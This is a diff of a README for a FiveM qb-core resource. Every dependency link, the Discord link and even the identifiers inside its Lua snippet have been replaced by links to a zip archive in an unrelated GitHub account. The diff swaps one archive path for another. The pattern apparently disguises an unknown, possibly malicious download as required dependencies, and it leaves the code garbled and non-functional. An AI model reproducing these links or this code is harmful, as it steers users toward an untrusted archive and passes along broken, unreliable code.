@@ -16,32 +16,32 @@ print ("Dont Forget That All Rights For LXR DEV ! 🧾 ")
 
 # [Requirements:]
 
-* [qbcore framework](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
-* [qb-target](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
-* [qb-core](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
-* [qb-logs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
-* [qb-traphouse](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
-* [qb-radio](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
-* [qb-drugs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
-* [qb-shops](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qbcore framework](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
+* [qb-target](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
+* [qb-core](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
+* [qb-logs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
+* [qb-traphouse](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
+* [qb-radio](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
+* [qb-drugs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
+* [qb-shops](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
 
 # [Add This Snippet If You Dont Have It In qb-core/server/player:] 👇
 
-function https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(ids, methodName, handler)
+function https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(ids, methodName, handler)
     local idType = type(ids)
     if idType == "number" then
         if ids == -1 then
-            for _, v in pairs(https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip) do
-                https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(methodName, handler)
+            for _, v in pairs(https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip) do
+                https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(methodName, handler)
             end
         else
-            if not https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip[ids] then return end
+            if not https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip[ids] then return end
 
-            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip[ids]https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(methodName, handler)
+            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip[ids]https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(methodName, handler)
         end
-    elseif idType == "table" and https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(ids) == "array" then
+    elseif idType == "table" and https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(ids) == "array" then
         for i = 1, #ids do
-            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(ids[i], methodName, handler)
+            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(ids[i], methodName, handler)
         end
     end
 end
@@ -50,7 +50,7 @@ end
 
 # You Can Find Us On :
 
-Our [Discord](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip) for updates, support.
+Our [Discord](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip) for updates, support.
 
 -------------------------------------------------------
 
